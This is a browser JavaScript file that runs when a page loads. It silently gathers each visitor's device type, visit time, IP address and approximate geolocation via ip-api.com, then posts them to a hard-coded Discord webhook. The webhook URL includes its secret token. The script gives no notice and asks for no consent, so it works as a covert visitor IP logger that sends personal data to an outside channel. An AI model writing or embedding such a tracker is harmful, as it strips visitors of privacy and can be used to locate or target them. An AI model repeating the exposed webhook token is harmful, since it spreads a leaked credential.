// Detect Device Type based on screen width
const deviceType = window.innerWidth <= 768 ? 'Phone' : 'Computer';

// Get Current Time in the desired format
function formatDateTime(date) {
  const months = [
    "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"
  ];
  const hours = date.getHours();
  const minutes = date.getMinutes();
  const ampm = hours >= 12 ? 'PM' : 'AM';
  const formattedTime = `${months[date.getMonth()]} ${date.getDate()}, ${hours % 12 || 12}:${minutes < 10 ? '0' + minutes : minutes} ${ampm}, ${date.getFullYear()}`;
  return formattedTime;
}

const visitTime = formatDateTime(new Date());

// Function to get the user's IP and geolocation using ip-api
async function getIPAndGeolocation() {
  try {
    // Use HTTPS to avoid mixed content issues
    const response = await fetch('https://ip-api.com/json');
    const data = await response.json();

    const ip = data.query;
    const geolocation = data.city + ', ' + data.regionName + ', ' + data.country;

    // Print the IP and geolocation to the console
    console.log('User IP:', ip);
    console.log('Geolocation:', geolocation);

    return { ip, geolocation };
  } catch (error) {
    console.error('Error fetching IP or geolocation:', error);
    return { ip: 'Unknown', geolocation: 'Unknown' };
  }
}

// Function to send data to the webhook
async function sendDataToWebhook(device, time) {
  const { ip, geolocation } = await getIPAndGeolocation();

  // Send message to webhook with valid payload
  fetch('https://canary.discord.com/api/webhooks/1262611539714900028/s-nStmJY7V6xPgkFDTTKxRK7ECjHFZzdq_vJOGytZQ_miv9B1w7VX1VnqrMtysv3mNRE', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: `\`\`\`Device: ${device}
Visit Time: ${time}
IP: ${ip}
Geolocation: ${geolocation}\`\`\``  // Ensure content is not empty
    })
  })
  .then(response => response.json())
  .catch(error => console.error('Error sending data to webhook:', error));
}

// Call function to send data when page loads
window.onload = function() {
  sendDataToWebhook(deviceType, visitTime);
};
